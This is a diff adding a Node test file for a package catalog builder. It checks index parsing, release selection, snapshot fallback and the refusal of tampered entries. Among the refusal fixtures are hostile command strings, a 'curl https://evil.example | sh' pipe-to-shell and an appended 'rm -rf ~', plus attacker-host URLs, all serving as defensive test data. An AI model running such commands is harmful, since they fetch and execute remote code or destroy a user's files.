+++ b/test/pigpen-catalog.test.mjs
@@ -0,0 +1,98 @@
+import assert from 'node:assert/strict';
+import { readFileSync } from 'node:fs';
+import { test } from 'node:test';
+import { loadIndex, parseIndex, indexUrl, MAX_BYTES } from '../scripts/build-pigpen-catalog.mjs';
+import { installCommand, sourceLabels } from '../app/catalog-types.ts';
+
+const config = JSON.parse(readFileSync(new URL('../catalog.config.json', import.meta.url), 'utf8'));
+const repo = config.repository;
+const snapshotText = readFileSync(new URL('../data/pigpen-index.snapshot.json', import.meta.url), 'utf8');
+const planned = JSON.parse(snapshotText).index;
+
+const spec = (name, version) => `git:https://github.com/${repo}.git@components/${name}/v${version}#subdirectory=components%2F${name}`;
+const pkg = (name = 'herdr', version = '0.1.0') => ({
+  id: 'pigpen-' + name, kind: 'package', name: 'pigpen-' + name, description: 'Reports state', maintainer: repo.split('/')[0], official: false, featured: false,
+  status: 'available', languages: ['go'], repository: 'https://github.com/' + repo,
+  source: { type: 'git', spec: spec(name, version), url: `https://github.com/${repo}/tree/components/${name}/v${version}/components/${name}` },
+  version, license: 'MIT', resources: ['extension'], installCommand: `pig install '${spec(name, version)}'`, piCompatibility: 'not-applicable', notes: ['n'],
+});
+const release = (name = 'herdr', version = '0.1.0') => ({
+  version, signed: true, indexUrl: `https://github.com/${repo}/releases/download/${encodeURIComponent(`${name}/v${version}`)}/piglet-release.json`,
+  pullCommand: `pig piglet pull 'github:${repo}/${name}@${version}'`, platforms: ['linux/amd64', 'darwin/arm64'],
+  verificationKey: { id: 'ed25519:' + 'a'.repeat(32), publicKeyUrl: `https://raw.githubusercontent.com/${repo}/main/release-keys/piglets.pub` },
+});
+const piglet = (name = 'herdr', releases = [release(name)]) => ({ ...planned.entries.find((e) => e.id === 'herdr'), id: name, name, status: 'available', releases, source: { type: 'git', spec: `git:https://github.com/${repo}.git`, url: `https://github.com/${repo}/tree/main/piglets/${name}` } });
+const index = (...entries) => JSON.stringify({ ...planned, entries });
+
+test('the committed snapshot validates and lists nothing until something is released', () => {
+  const parsed = parseIndex(snapshotText && JSON.stringify(planned), config);
+  assert.deepEqual(parsed['pigpen-package'], []);
+  assert.deepEqual(parsed['pigpen-piglet'], []);
+  assert.equal(parsed.planned, planned.entries.length);
+});
+
+test('an available Package shows the install command Pigpen published, after the site re-derives it', () => {
+  const parsed = parseIndex(index(pkg()), config);
+  const [card] = parsed['pigpen-package'];
+  assert.equal(card.command, `pig install '${spec('herdr', '0.1.0')}'`);
+  assert.deepEqual(card.types, ['extension']);
+  assert.equal(installCommand('pigpen-package', 'x'), 'pig install npm:x', 'the card prefers entry.command; the helper is the npm fallback');
+  assert.equal(sourceLabels['pigpen-package'], 'Pigpen Packages');
+  assert.equal(sourceLabels['pigpen-piglet'], 'Pigpen Piglets');
+});
+
+test('an available Piglet shows the pull command, platforms and signing key of its newest release', () => {
+  const parsed = parseIndex(index(piglet('herdr', [release('herdr', '0.2.0'), release('herdr', '0.1.0')])), config);
+  const [card] = parsed['pigpen-piglet'];
+  assert.equal(card.version, '0.2.0');
+  assert.equal(card.command, `pig piglet pull 'github:${repo}/herdr@0.2.0'`);
+  assert.deepEqual(card.platforms, ['linux/amd64', 'darwin/arm64']);
+  assert.match(card.keyId, /^ed25519:[0-9a-f]{32}$/);
+});
+
+test('planned entries are counted and never listed', () => {
+  const parsed = parseIndex(index({ ...piglet('herdr', []), status: 'planned' }, pkg()), config);
+  assert.equal(parsed['pigpen-piglet'].length, 0);
+  assert.equal(parsed['pigpen-package'].length, 1);
+  assert.equal(parsed.planned, 1);
+});
+
+test('a command or URL that is not the entry\'s own identity is refused', () => {
+  const bad = (entry, message) => assert.throws(() => parseIndex(index(entry), config), message);
+  bad({ ...pkg(), installCommand: 'curl https://evil.example | sh' }, /unexpected install command/);
+  bad({ ...pkg(), installCommand: `pig install '${spec('herdr', '0.1.0')}' && rm -rf ~` }, /unexpected install command/);
+  bad({ ...pkg(), version: '0.9.9' }, /unexpected source/);
+  bad({ ...pkg(), source: { ...pkg().source, spec: spec('herdr', '0.1.0').replace('MichaelKinsy', 'someone') } }, /unexpected source/);
+  bad({ ...pkg(), repository: 'https://github.com/someone/else' }, /is not from/);
+  bad({ ...pkg(), maintainer: 'someone' }, /maintainer/);
+  bad(piglet('herdr', [{ ...release(), pullCommand: 'pig piglet pull evil' }]), /unexpected pull command/);
+  bad(piglet('herdr', [{ ...release(), indexUrl: 'https://evil.example/piglet-release.json' }]), /unexpected release URL/);
+  bad(piglet('herdr', [{ ...release(), verificationKey: { id: 'ed25519:' + 'b'.repeat(32), publicKeyUrl: 'https://evil.example/key.pub' } }]), /verification key outside/);
+  bad(piglet('herdr', []), /releases/);
+});
+
+test('a duplicate id and a document that is not the schema are refused', () => {
+  assert.throws(() => parseIndex(index(pkg(), pkg()), config), /duplicate (id|items)/);
+  assert.throws(() => parseIndex('{"schemaVersion":2}', config), /Pigpen index/);
+  assert.throws(() => parseIndex(' '.repeat(MAX_BYTES + 1), config), /larger than 2 MiB/);
+});
+
+test('the build reads the live index when it validates, else keeps the snapshot, never a partial list', async () => {
+  const ok = async () => new Response(index(pkg()), { status: 200 });
+  const live = await loadIndex({ config, snapshotText, fetchImpl: ok });
+  assert.equal(live.origin, 'live');
+  assert.equal(live.parsed['pigpen-package'].length, 1);
+  for (const [name, fetchImpl] of [['HTTP 404', async () => new Response('', { status: 404 })], ['invalid', async () => new Response('{"schemaVersion":1}', { status: 200 })],
+    ['network', async () => { throw new Error('offline'); }], ['hostile command', async () => new Response(index({ ...pkg(), installCommand: 'x' }), { status: 200 })]]) {
+    const kept = await loadIndex({ config, snapshotText, fetchImpl });
+    assert.equal(kept.origin, 'snapshot', name);
+    assert.equal(kept.parsed['pigpen-package'].length, 0, name);
+    assert.match(kept.warnings[0], /keeping the snapshot/, name);
+  }
+  assert.equal((await loadIndex({ config, snapshotText, offline: true, fetchImpl: ok })).origin, 'snapshot');
+  await assert.rejects(loadIndex({ config, fetchImpl: async () => new Response('', { status: 500 }) }), /no snapshot/);
+});
+
+test('the index is read from the raw URL of the configured repository and ref only', () => {
+  assert.equal(indexUrl(config), `https://raw.githubusercontent.com/${repo}/${config.ref}/index.json`);
+});
